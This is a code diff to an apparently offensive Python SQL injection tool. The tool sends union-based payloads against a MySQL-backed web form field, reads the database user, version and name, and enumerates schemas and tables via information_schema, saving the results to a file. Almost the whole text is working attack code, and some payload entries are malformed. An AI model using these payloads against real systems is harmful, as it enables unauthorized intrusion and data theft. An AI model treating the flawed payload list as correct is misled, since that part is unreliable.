@@ -76,17 +76,25 @@ def send_payload(url, http_method, data, vulnerable_field, payload):
     return response
 
 
-def exploit_union_based_sqli(url, http_method, data, vulnerable_field, columns):
+def exploit_union_based_sqli(url, http_method, data, vulnerable_field, columns, file):
     """
     Test SQLi payloads with a known number of columns
     """
     print(f"{Fore.BLUE}Testing exploitation payloads...{Style.RESET_ALL}")
     payloads = [
             "USER()",
-            "@@VERSION, USER()",
+            "USER()", "NULL()",
+            "USER()", "NULL()", "NULL()",
+            "@@VERSION",
+            "@@VERSION", "NULL()",
+            "@@VERSION", "NULL()", "NULL()",
             "DATABASE(), USER()",
+            "DATABASE(), NULL()",
+            "DATABASE(), NULL(), NULL()",
             "DATABASE(), @@VERSION",
             "DATABASE(), USER(), @@VERSION",
+            "schema_name, NULL from information_schema.schemata",
+            "table_name, NULL from information_schema.tables where table_schema=database()"
             ]
     for base_payload in payloads:
         payload = generate_payload(base_payload, columns)
@@ -94,16 +102,15 @@ def exploit_union_based_sqli(url, http_method, data, vulnerable_field, columns):
         response = send_payload(url, http_method, data, vulnerable_field, payload)
         if check_response(response, payload):
             print(f"{Fore.GREEN}Payload success: {payload}{Style.RESET_ALL}")
-            extract_data(response)
+            extract_data(response, file, payload, vulnerable_field)
         else:
             print(f"{Fore.RED}Failed to send payload: {payload}{Style.RESET_ALL}")
 
 
-
-def test_mysql(url, http_method, data, vulnerable_field):
+def test_mysql(url, http_method, data, vulnerable_field, file):
     """
     Wrapper function to test MySQL vulnerabilities
     """
     print(f"{Fore.BLUE}Testing MySQL vulnerabilities...{Style.RESET_ALL}")
     columns = test_union_column_count(url, http_method, data, vulnerable_field)
-    exploit_union_based_sqli(url, http_method, data, vulnerable_field, columns)
+    exploit_union_based_sqli(url, http_method, data, vulnerable_field, columns, file)
